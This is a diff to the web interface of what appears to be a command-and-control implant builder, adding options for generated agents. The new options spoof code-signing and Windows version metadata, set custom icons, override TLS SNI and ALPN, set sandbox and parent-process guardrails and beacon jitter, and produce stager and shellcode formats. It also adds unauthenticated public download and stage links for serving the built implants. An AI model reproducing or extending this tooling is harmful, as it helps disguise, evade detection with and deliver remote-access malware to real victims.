@@ -231,6 +231,23 @@
     // ── Active job: the one currently displayed in the log pane ───────
 
     var activeJobId = null;
+    var jobFormats  = {};   // jobId -> requested format, for stage-link rendering
+    // ── File upload helpers (icon / certs bundle -> base64) ───────────
+
+    function readFileB64(id) {
+        return new Promise(function (resolve) {
+            var el = document.getElementById(id);
+            if (!el || !el.files || !el.files.length) { resolve(null); return; }
+            var reader = new FileReader();
+            reader.onload = function () {
+                var res = String(reader.result || '');
+                var idx = res.indexOf('base64,');
+                resolve(idx >= 0 ? res.slice(idx + 7) : res);
+            };
+            reader.onerror = function () { resolve(null); };
+            reader.readAsDataURL(el.files[0]);
+        });
+    }
 
     // ── Build ──────────────────────────────────────────────────────────
 
@@ -253,8 +270,8 @@
             profile:    val('builder-profile',     'default'),
             format:     val('builder-format',      'exe'),
             sleep:      intVal('builder-sleep',     40),
-            jitter_min: intVal('builder-jitter-min', 20),
-            jitter_max: intVal('builder-jitter-max', 40),
+            jitter_min: intVal('builder-jitter-min', 0),
+            jitter_max: intVal('builder-jitter-max', 100),
             bloat:      intVal('builder-bloat',      0),
             debug:      chk('builder-debug'),
             days:       intVal('builder-days',       0),
@@ -275,16 +292,114 @@
             sc_userdata: val('builder-sc-userdata', 'None'),
             sc_flags:    intVal('builder-sc-flags',  0),
             sc_output:   val('builder-sc-output',   'bin'),
+            // Advanced
+            sign:        chk('builder-sign'),
+            allow_vm:    chk('builder-allow-vm'),
+            hibernation_mode: chk('builder-hibernation'),
         };
+
+        // Optional advanced fields - only sent when set
+        // Parent-process allowlist (comma-separated; API field name assumed
+        // to be valid_parents, matching the guardrails group)
+        var validParents = val('builder-valid-parents', '').trim();
+        if (validParents) payload.valid_parents = validParents;
+        var signCert = val('builder-sign-cert', '').trim();
+        if (signCert) payload.sign_cert = signCert;
+        var signPass = val('builder-sign-pass', '');
+        if (signPass) payload.sign_pass = signPass;
+        var signTs = val('builder-sign-ts', '').trim();
+        if (signTs) payload.sign_ts = signTs;
+        // Authenticode metadata overrides (only forwarded when signing)
+        if (payload.sign) {
+            var signName = val('builder-sign-name', '').trim();
+            if (signName) payload.sign_name = signName;
+            var signUrl = val('builder-sign-url', '').trim();
+            if (signUrl) payload.sign_url = signUrl;
+            var signCn = val('builder-sign-cn', '').trim();
+            if (signCn) payload.sign_cn = signCn;
+        }
+        var sni = val('builder-sni-override', '').trim();
+        if (sni) payload.sni_override = sni;
+        var alpn = val('builder-alpn', '').trim();
+        if (alpn) payload.alpn_protocols = alpn.split(',').map(s => s.trim()).filter(Boolean);
+        var batchSize = val('builder-batch-size', '').trim();
+        if (batchSize) payload.batch_size = parseInt(batchSize, 10);
+        var pivotPort = val('builder-auto-pivot-port', '').trim();
+        if (pivotPort) payload.auto_pivot_port = parseInt(pivotPort, 10);
+
+        // Artifact customization
+        var nameVal = val('builder-name', '').trim();
+        if (nameVal) payload.name = nameVal;
+        var preset = val('builder-icon-preset', '');
+        if (preset) payload.icon_preset = preset;
+
+        // PE VERSIONINFO (Windows exe/service)
+        var peCompany  = val('builder-pe-company', '').trim();
+        if (peCompany) payload.pe_company = peCompany;
+        var peProduct  = val('builder-pe-product', '').trim();
+        if (peProduct) payload.pe_product = peProduct;
+        var peDesc     = val('builder-pe-description', '').trim();
+        if (peDesc) payload.pe_description = peDesc;
+        var peFileVer  = val('builder-pe-file-version', '').trim();
+        if (peFileVer) payload.pe_file_version = peFileVer;
+        var peProdVer  = val('builder-pe-product-version', '').trim();
+        if (peProdVer) payload.pe_product_version = peProdVer;
+
+        // ELF .comment (Linux targets)
+        var elfComment = val('builder-elf-comment', '').trim();
+        if (elfComment) payload.elf_comment = elfComment;
+
+        // Custom PIC C source (only used when format === 'pic_c')
+        if (payload.format === 'pic_c') {
+            var picSrc = val('builder-pic-src', '');
+            if (picSrc.trim()) payload.pic_src = picSrc;
+        }
+
+        // Conversion pipeline (only used when format === 'bin'; omit when
+        // empty so the server applies its default, e.g. pe,donut on Windows)
+        if (payload.format === 'bin') {
+            var pipeline = val('builder-pipeline', '').trim();
+            if (pipeline) payload.pipeline = pipeline;
+        }
 
         clearLog();
         appendLog('[*] Submitting build request...', 'text-cyan-400');
         setBadge('', 'hidden');
         var dlRow = document.getElementById('builder-download-row');
         if (dlRow) dlRow.classList.add('hidden');
+        var plRow0 = document.getElementById('builder-public-link-row');
+        if (plRow0) plRow0.style.display = 'none';
 
         setBtn('<i class="fas fa-spinner fa-spin mr-2"></i>Submitting...', true);
 
+        // Read optional uploads (icon / certs bundle) as base64 first.
+        Promise.all([
+            readFileB64('builder-icon-file'),
+            readFileB64('builder-certs-ca'),
+            readFileB64('builder-certs-client'),
+            readFileB64('builder-certs-key'),
+        ]).then(function (results) {
+            if (results[0]) {
+                payload.icon_b64 = results[0];
+                delete payload.icon_preset; // custom icon file wins over preset
+            }
+            var ca = results[1], cc = results[2], ck = results[3];
+            if ((ca || cc || ck) && !(ca && cc && ck)) {
+                resetBtn();
+                appendLog('[-] Certs bundle incomplete: provide ca.crt, client.crt and client.key.der (all three).', 'text-red-400');
+                return;
+            }
+            if (ca && cc && ck) {
+                payload.certs_ca_b64         = ca;
+                payload.certs_client_crt_b64 = cc;
+                payload.certs_client_key_b64 = ck;
+            }
+            submitBuild(payload);
+        });
+    }
+
+    function submitBuild(payload) {
+        var apiKey = getApiKey();
         fetch(getApiUrl() + '/api/builder/build', {
             method:  'POST',
             headers: { 'X-API-KEY': apiKey, 'Content-Type': 'application/json' },
@@ -313,6 +428,7 @@
 
             activeJobId           = data.job_id;
             logCounts[activeJobId] = 0;
+            jobFormats[activeJobId] = payload.format;
 
             appendLog('[*] Job queued: ' + data.job_id, 'text-cyan-400');
             appendLog('[*] Compiling... (this takes several minutes)', 'text-gray-400');
@@ -357,7 +473,7 @@
 
                 if (data.status === 'success') {
                     stopPolling(jobId);
-                    if (jobId === activeJobId) showSuccess(jobId, data.artifact_name);
+                    if (jobId === activeJobId) showSuccess(jobId, data.artifact_name, data.download_url, jobFormats[jobId]);
                     refreshJobList();
                     if (window.Notify) window.Notify.toast(
                         'Build done: ' + (data.artifact_name || jobId.slice(0,8)), 'success', 8000);
@@ -377,7 +493,7 @@
         }, 2000);
     }
 
-    function showSuccess(jobId, artifactName) {
+    function showSuccess(jobId, artifactName, downloadUrl, format) {
         setBadge('<i class="fas fa-check-circle mr-1"></i>Build succeeded',
             'inline-flex items-center gap-2 px-3 py-1 rounded text-xs font-bold bg-green-900 text-green-200 border border-green-700');
 
@@ -393,6 +509,77 @@
             if (span) span.textContent = artifactName || 'Download agent';
             dlRow.classList.remove('hidden');
         }
+
+        // Public (unauthenticated) download link, shown next to the
+        // authenticated download button when the server registered one.
+        var plRow = document.getElementById('builder-public-link-row');
+        var plIn  = document.getElementById('builder-public-link');
+        if (plRow && plIn) {
+            if (downloadUrl) {
+                plIn.value = window.location.origin + downloadUrl;
+                plRow.style.display = 'flex';
+            } else {
+                plRow.style.display = 'none';
+            }
+        }
+
+        // Staged-download link for stager builds. The stage URL is derived
+        // from the job id (GET /stage/<build_id> on the server).
+        var stRow = document.getElementById('builder-stage-link-row');
+        var stIn  = document.getElementById('builder-stage-link');
+        if (stRow && stIn) {
+            if (format === 'stager') {
+                stIn.value = window.location.origin + '/stage/' + jobId;
+                stRow.style.display = 'flex';
+            } else {
+                stRow.style.display = 'none';
+            }
+        }
+    }
+
+    // ── Copy helpers for the public download link ──────────────────────
+
+    function copyText(text) {
+        var done = function (ok) {
+            if (window.Notify) window.Notify.toast(
+                ok ? 'Public link copied to clipboard' : 'Copy failed - select and copy manually',
+                ok ? 'success' : 'error');
+        };
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(text).then(
+                function () { done(true); },
+                function () { legacyCopy(text, done); });
+        } else {
+            legacyCopy(text, done);
+        }
+    }
+
+    function legacyCopy(text, done) {
+        var ta = document.createElement('textarea');
+        ta.value = text;
+        ta.style.position = 'fixed';
+        ta.style.opacity  = '0';
+        document.body.appendChild(ta);
+        ta.select();
+        var ok = false;
+        try { ok = document.execCommand('copy'); } catch (e) { ok = false; }
+        document.body.removeChild(ta);
+        done(ok);
+    }
+
+    function copyPublicLink() {
+        var el = document.getElementById('builder-public-link');
+        if (el && el.value) copyText(el.value);
+    }
+
+    function copyStageLink() {
+        var el = document.getElementById('builder-stage-link');
+        if (el && el.value) copyText(el.value);
+    }
+
+    function copyLink(url) {
+        var full = (url && url.charAt(0) === '/') ? window.location.origin + url : url;
+        copyText(full);
     }
 
     // ── Download via fetch+blob so X-API-KEY header is sent ──────────
@@ -453,7 +640,17 @@
             logCounts[jobId] = (data.log || []).length;
 
             if (data.status === 'success') {
-                showSuccess(jobId, data.artifact_name);
+                // Old jobs are not in jobFormats; recover the requested
+                // format from the "[*] Format: <name>" build-log line.
+                var fmt = jobFormats[jobId];
+                if (!fmt) {
+                    var fmtLine = (data.log || []).find(function (l) { return l.indexOf('Format:') !== -1; });
+                    if (fmtLine) {
+                        var m = fmtLine.match(/Format:\s+(\S+)/);
+                        if (m) fmt = m[1];
+                    }
+                }
+                showSuccess(jobId, data.artifact_name, data.download_url, fmt);
             } else if (data.status === 'running') {
                 appendLog('[*] Build still running - tailing live...', 'text-cyan-400');
                 startPolling(jobId, true);
@@ -499,6 +696,13 @@
                     + '<i class="fas fa-download mr-1"></i>' + art + '</button>'
                     : '';
 
+                var linkBtn = (j.status === 'success' && j.download_url)
+                    ? '<button onclick="window.BuilderManager.copyLink(\'' + escStr(j.download_url) + '\')" '
+                    + 'class="text-cyan-400 hover:text-white border border-cyan-700 hover:bg-cyan-800 '
+                    + 'px-2 py-1 rounded text-xs transition mr-1" title="Copy public (no-auth) link">'
+                    + '<i class="fas fa-link mr-1"></i>Link</button>'
+                    : '';
+
                 var viewBtn = '<button onclick="window.BuilderManager.viewJob(\'' + escStr(j.job_id) + '\')" '
                     + 'class="text-gray-400 hover:text-white border border-gray-700 hover:bg-gray-700 '
                     + 'px-2 py-1 rounded text-xs transition">'
@@ -510,11 +714,88 @@
                     +   '<i class="fas ' + sIcon + ' mr-1"></i>' + escStr(j.status) + '</span></td>'
                     + '<td class="p-3 text-xs text-gray-400 font-mono hide-mobile">' + escStr(ts) + '</td>'
                     + '<td class="p-3 text-xs text-gray-400 font-mono hide-mobile">' + escStr(fin || '-') + '</td>'
-                    + '<td class="p-3">' + dlBtn + viewBtn + '</td>'
+                    + '<td class="p-3">' + dlBtn + linkBtn + viewBtn + '</td>'
                     + '</tr>';
             }).join('');
         })
         .catch(function (err) { console.error('Builder job list:', err); });
+    }
+
+    // ── Platform-conditional visibility ────────────────────────────────
+    //
+    // Driven by data-platforms attributes (comma-separated platform list)
+    // on sections/fields, plus option-level data-platforms on the format
+    // select. The mapping mirrors src/build_validate.rs and
+    // src/api/routes/builder.rs validate_request:
+    //   - dll/service/shellcode/donut/pe_to_shellcode/bin: windows only
+    //   - format=stager: transport restricted to http/https
+    //   - evasion flags + sleep mask: windows-only behavior
+    //   - icon/PE version/signing: windows; ELF .comment: linux/linux-musl
+    //   - guardrails (domain/hostname/hours/no_system): every platform
+    function applyPlatformVisibility() {
+        var platEl  = document.getElementById('builder-platform');
+        var fmtSel  = document.getElementById('builder-format');
+        var trSel   = document.getElementById('builder-transport');
+        if (!platEl) return;
+        var platform = platEl.value;
+
+        // Sections and fields tagged with data-platforms
+        document.querySelectorAll('#page-builder [data-platforms]').forEach(function (el) {
+            if (el.tagName === 'OPTION') return;   // handled below
+            var list = el.getAttribute('data-platforms').split(',');
+            el.style.display = list.indexOf(platform) === -1 ? 'none' : '';
+        });
+
+        // Format options: disable windows-only formats on other platforms,
+        // coerce the selection to exe when the active one is unsupported.
+        var fmt = fmtSel ? fmtSel.value : 'exe';
+        if (fmtSel) {
+            Array.prototype.forEach.call(fmtSel.options, function (opt) {
+                var plats = opt.getAttribute('data-platforms');
+                opt.disabled = !!(plats && plats.split(',').indexOf(platform) === -1);
+            });
+            if (fmtSel.selectedIndex >= 0 && fmtSel.options[fmtSel.selectedIndex].disabled) {
+                fmtSel.value = 'exe';
+                fmt = 'exe';
+                if (window.Notify) window.Notify.toast('Selected format is Windows-only - switched to exe.', 'info');
+            }
+        }
+
+        // format=stager can only speak HTTPS to /stage/<build_id> (raw-TCP
+        // HTTP fallback) - restrict transport accordingly and coerce.
+        if (trSel) {
+            var stagerOk = ['http', 'https'];
+            Array.prototype.forEach.call(trSel.options, function (opt) {
+                opt.disabled = (fmt === 'stager') && stagerOk.indexOf(opt.value) === -1;
+            });
+            if (fmt === 'stager' && stagerOk.indexOf(trSel.value) === -1) {
+                trSel.value = 'https';
+                if (window.Notify) window.Notify.toast('format=stager requires http/https - transport switched to https.', 'info');
+            }
+        }
+        return fmt;
+    }
+
+    // Suggested C2 addresses for the host combo box. Suggestion source
+    // only: free text stays usable and an absent endpoint is not an error.
+    function loadC2Hints() {
+        var dl = document.getElementById('builder-host-ips');
+        if (!dl) return;
+        fetch(getApiUrl() + '/api/server/c2-hints', {
+            headers: { 'X-API-KEY': getApiKey() },
+        })
+        .then(function (r) {
+            if (r.status === 401) { if (window.Auth) window.Auth.logout(); return null; }
+            if (!r.ok) return null;   // endpoint not present on older servers
+            return r.json();
+        })
+        .then(function (data) {
+            if (!data || !Array.isArray(data.ips)) return;
+            dl.innerHTML = data.ips.map(function (ip) {
+                return '<option value="' + String(ip).replace(/[<>&"]/g, '') + '"></option>';
+            }).join('');
+        })
+        .catch(function () { /* suggestions unavailable - fine */ });
     }
 
     // ── Public API ─────────────────────────────────────────────────────
@@ -525,31 +806,42 @@
             // already the right size before any build is started or viewed.
             _applyScrollStyle();
 
-            // Show shellcode options only when that format is selected, and
-            // force platform=windows (the only target shellcode supports).
+            // Show the per-format option blocks only for the selected format,
+            // and force platform=windows for the Windows-only formats
+            // (shellcode / donut / pe_to_shellcode / bin).
             var fmtSel = document.getElementById('builder-format');
             var scOpts = document.getElementById('builder-shellcode-opts');
-            if (fmtSel && scOpts) {
-                var syncScOpts = function () {
-                    var isSc = fmtSel.value === 'shellcode';
-                    scOpts.style.display = isSc ? '' : 'none';
-                    if (isSc) {
-                        var plat = document.getElementById('builder-platform');
-                        if (plat && plat.value !== 'windows') {
-                            plat.value = 'windows';
-                            if (window.Notify) window.Notify.toast('Shellcode requires Windows x64 - platform switched.', 'info');
-                        }
+            var picOpts = document.getElementById('builder-pic-opts');
+            var pipeOpts = document.getElementById('builder-pipeline-opts');
+            var platSel = document.getElementById('builder-platform');
+            var syncFormatOpts = function () {
+                if (!fmtSel) return;
+                var fmt = fmtSel.value;
+                if (scOpts)   scOpts.style.display   = fmt === 'shellcode' ? '' : 'none';
+                if (picOpts)  picOpts.style.display  = fmt === 'pic_c'     ? '' : 'none';
+                if (pipeOpts) pipeOpts.style.display = fmt === 'bin'       ? '' : 'none';
+                if (fmt === 'shellcode' || fmt === 'donut' || fmt === 'pe_to_shellcode' || fmt === 'bin') {
+                    if (platSel && platSel.value !== 'windows') {
+                        platSel.value = 'windows';
+                        if (window.Notify) window.Notify.toast('Format "' + fmt + '" requires Windows x64 - platform switched.', 'info');
+                        applyPlatformVisibility();
                     }
-                };
-                fmtSel.addEventListener('change', syncScOpts);
-                syncScOpts();
-            }
+                }
+            };
+            if (fmtSel) fmtSel.addEventListener('change', function () { syncFormatOpts(); applyPlatformVisibility(); });
+            if (platSel) platSel.addEventListener('change', function () { applyPlatformVisibility(); syncFormatOpts(); });
+            syncFormatOpts();
+            applyPlatformVisibility();
+            loadC2Hints();
         },
         build:          build,
         downloadJob:    downloadJob,
         viewJob:        viewJob,
         refreshJobList: refreshJobList,
         filterLog:      filterLog,
+        copyPublicLink: copyPublicLink,
+        copyStageLink:  copyStageLink,
+        copyLink:       copyLink,
     };
 
 }());
